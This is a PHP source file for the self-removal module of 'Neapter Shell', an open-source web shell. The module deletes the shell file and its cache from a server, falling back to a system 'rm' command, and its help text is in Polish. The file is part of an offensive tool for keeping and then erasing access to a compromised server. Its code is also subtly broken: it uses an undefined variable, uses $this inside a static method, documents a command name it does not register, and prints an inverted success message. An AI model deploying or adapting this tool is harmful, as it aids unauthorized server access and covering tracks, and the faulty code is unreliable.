<?php

/**
 * Neapter Shell
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */

/**
 * Remove shell from server
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */
class ModuleDestroy extends ModuleAbstract
{
    /**
     * Unique key. User have to put that key to remove shell
     *
     * @var string
     */
    protected $sKey;

    /**
     * File to remove
     *
     * @var string
     */
    protected $sFilename;

    /**
     * Constructor, check if posix_getpwuid and posix_getgrgid exist
     *
     * @param Shell $oShell Shell object
     * @param Utils $oUtils Utils object
     * @param Args  $oArgs  Args object
     */
    public function __construct(
        Shell $oShell,
        Utils $oUtils,
        Args $oArgs
    ) {
        parent::__construct($oShell, $oUtils, $oArgs);

        if (!($sKey = $this->oUtils->cacheGet('destroy_shell_key'))) {
            $sKey = strtoupper(substr(md5(uniqid()), 0, 8));
            $this->oUtils->cacheSet('destroy_shell_key', $sKey);
        }

        $this->sKey = $sKey;
        $this->sFilename = $oUtils->getShellFilename();
    }

    /**
     * Get list of available commands
     *
     * @return array
     */
    public static function getCommands()
    {
        return array(
            'destroy',
            'removeshell'
        );
    }

    /**
     * Get module version
     *
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.1 2016-06-18 - <krzotr@gmail.com>';
    }

    /**
     * Get details module information
     *
     * @return string
     */
    public static function getHelp()
    {
        $sHelp = <<<DATA
Trwałe usunięcie NeapterShell. Plik %s zostanie usunięty wraz z wszystkimi plikami cache

    Użycie:
        remove
        remove key

    Przykład:
        remove     - zostanie wyświetlony specjalny identyfikator
        remove key - trwałe usunięcie shella
DATA;

        return sprintf($sHelp, $this->sFilename);
    }

    /**
     * Execute module
     *
     * @return string
     */
    public function get()
    {
        if ($this->oArgs->getNumberOfParams() === 0) {
            return sprintf(
                "W celu usunięcia shell wprowadź \"%s\" jako parametr",
                $sKey
            );
        }

        if (($this->oArgs->getParam(0) === $this->sKey)) {
            $this->oUtils->cacheFlush();

            if (! @unlink($this->sFilename)) {
                /* Try to remove using system command */
                if ($this->oUtils->isExecutable()) {
                    $sCmd = sprintf('rm "%s"', $this->sFilename);

                    $this->oShell->getCommandOutput($sCmd);
                }
            }

            clearstatcache();

            return sprintf(
                'Shell %szostał usunięty',
                (is_file($this->sFilename) ? '' : 'nie ')
            );
        }

        return self::getHelp();
    }
}
